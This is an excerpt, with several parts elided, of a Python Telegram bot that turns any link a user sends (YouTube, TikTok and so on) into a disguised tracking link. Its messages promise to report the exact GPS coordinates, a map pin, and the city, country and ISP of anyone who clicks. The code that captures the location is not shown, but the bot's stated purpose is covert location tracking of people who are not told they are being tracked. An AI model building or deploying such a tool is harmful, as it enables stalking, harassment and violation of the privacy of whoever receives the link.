# location_bot.py - FULL TRACKING BOT WITH MAPS!
import os
import logging
import requests
import json
...
def create_tracking_link(slug):
    base_url = os.environ.get('RENDER_URL', 'https://location-tracker-bot.onrender.com')
...
async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text(
        ...
        f"🎯 <b>Redirects to:</b>\n"
        f"<code>{text}</code>\n\n"
        f"📍 <b>Share this link with ANYONE!</b>\n"
        f"When they click it, I'll send you:\n"
        f"• EXACT GPS coordinates\n"
        f"• Google Maps link\n"
        f"• Location pin in Telegram\n"
        f"• City, Country, ISP info\n\n"
...
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if data == "create":
        await query.edit_message_text(
            ...
            "Simply send me any link (YouTube, TikTok, etc.) and I'll create a tracking link!\n\n"
            "📤 <b>Send me a link NOW!</b>\n\n"
            "Examples:\n"
        ...
        if user_id not in user_links or not user_links[user_id]:
            await query.edit_message_text(
                "📡 <b>LIVE MONITOR</b>\n\n"
                "No links yet. Send me a link to start tracking!",
                parse_mode='HTML'
            )
            return
